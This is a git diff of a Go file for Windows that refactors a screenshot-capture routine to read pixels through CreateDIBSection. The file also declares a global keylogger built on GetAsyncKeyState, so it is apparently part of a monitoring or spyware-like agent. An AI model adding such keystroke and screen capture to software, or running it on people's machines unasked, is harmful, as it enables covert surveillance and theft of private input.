@@ -21,20 +21,19 @@ import (
 )
 
 var (
-	user32              = syscall.NewLazyDLL("user32.dll")
-	gdi32               = syscall.NewLazyDLL("gdi32.dll")
-	getAsyncKeyState    = user32.NewProc("GetAsyncKeyState")
-	getSystemMetrics    = user32.NewProc("GetSystemMetrics")
-	getDC               = user32.NewProc("GetDC")
-	releaseDC           = user32.NewProc("ReleaseDC")
-	createCompatibleDC  = gdi32.NewProc("CreateCompatibleDC")
-	createCompatibleBmp = gdi32.NewProc("CreateCompatibleBitmap")
-	selectObject        = gdi32.NewProc("SelectObject")
-	bitBlt              = gdi32.NewProc("BitBlt")
-	getDIBits           = gdi32.NewProc("GetDIBits")
-	deleteObject        = gdi32.NewProc("DeleteObject")
-	deleteDC            = gdi32.NewProc("DeleteDC")
-	keylogger           = &windowsKeylogger{}
+	user32             = syscall.NewLazyDLL("user32.dll")
+	gdi32              = syscall.NewLazyDLL("gdi32.dll")
+	getAsyncKeyState   = user32.NewProc("GetAsyncKeyState")
+	getSystemMetrics   = user32.NewProc("GetSystemMetrics")
+	getDC              = user32.NewProc("GetDC")
+	releaseDC          = user32.NewProc("ReleaseDC")
+	createCompatibleDC = gdi32.NewProc("CreateCompatibleDC")
+	createDIBSection   = gdi32.NewProc("CreateDIBSection")
+	selectObject       = gdi32.NewProc("SelectObject")
+	bitBlt             = gdi32.NewProc("BitBlt")
+	deleteObject       = gdi32.NewProc("DeleteObject")
+	deleteDC           = gdi32.NewProc("DeleteDC")
+	keylogger          = &windowsKeylogger{}
 )
 
 const (
@@ -99,11 +98,30 @@ func captureScreenshot() (string, error) {
 	}
 	defer deleteDC.Call(memoryDC)
 
-	bitmap, _, _ := createCompatibleBmp.Call(screenDC, uintptr(width), uintptr(height))
+	info := bitmapInfo{Header: bitmapInfoHeader{
+		Size:        uint32(unsafe.Sizeof(bitmapInfoHeader{})),
+		Width:       int32(width),
+		Height:      -int32(height),
+		Planes:      1,
+		BitCount:    32,
+		Compression: biRGB,
+	}}
+	var bits uintptr
+	bitmap, _, _ := createDIBSection.Call(
+		screenDC,
+		uintptr(unsafe.Pointer(&info)),
+		dibRGBColors,
+		uintptr(unsafe.Pointer(&bits)),
+		0,
+		0,
+	)
 	if bitmap == 0 {
-		return "", errors.New("CreateCompatibleBitmap failed")
+		return "", errors.New("CreateDIBSection failed")
 	}
 	defer deleteObject.Call(bitmap)
+	if bits == 0 {
+		return "", errors.New("CreateDIBSection returned an empty pixel buffer")
+	}
 
 	previous, _, _ := selectObject.Call(memoryDC, bitmap)
 	if previous == 0 {
@@ -119,33 +137,14 @@ func captureScreenshot() (string, error) {
 	if result, _, _ := bitBlt.Call(memoryDC, 0, 0, uintptr(width), uintptr(height), screenDC, 0, 0, srccopy|captureBlt); result == 0 {
 		return "", errors.New("BitBlt failed")
 	}
-	// GetDIBits requires the bitmap to be deselected from the device context.
+	// Release the bitmap before reading its DIB section buffer and before cleanup.
 	if selected, _, _ := selectObject.Call(memoryDC, previous); selected == 0 {
 		return "", errors.New("restore device context failed")
 	}
 	bitmapSelected = false
 
 	pixels := make([]byte, width*height*4)
-	info := bitmapInfo{Header: bitmapInfoHeader{
-		Size:        uint32(unsafe.Sizeof(bitmapInfoHeader{})),
-		Width:       int32(width),
-		Height:      -int32(height),
-		Planes:      1,
-		BitCount:    32,
-		Compression: biRGB,
-	}}
-	rows, _, _ := getDIBits.Call(
-		memoryDC,
-		bitmap,
-		0,
-		uintptr(height),
-		uintptr(unsafe.Pointer(&pixels[0])),
-		uintptr(unsafe.Pointer(&info)),
-		dibRGBColors,
-	)
-	if rows != uintptr(height) {
-		return "", errors.New("GetDIBits failed")
-	}
+	copy(pixels, unsafe.Slice((*byte)(unsafe.Pointer(bits)), len(pixels)))
 
 	rgba := image.NewRGBA(image.Rect(0, 0, width, height))
 	for i := 0; i < len(pixels); i += 4 {
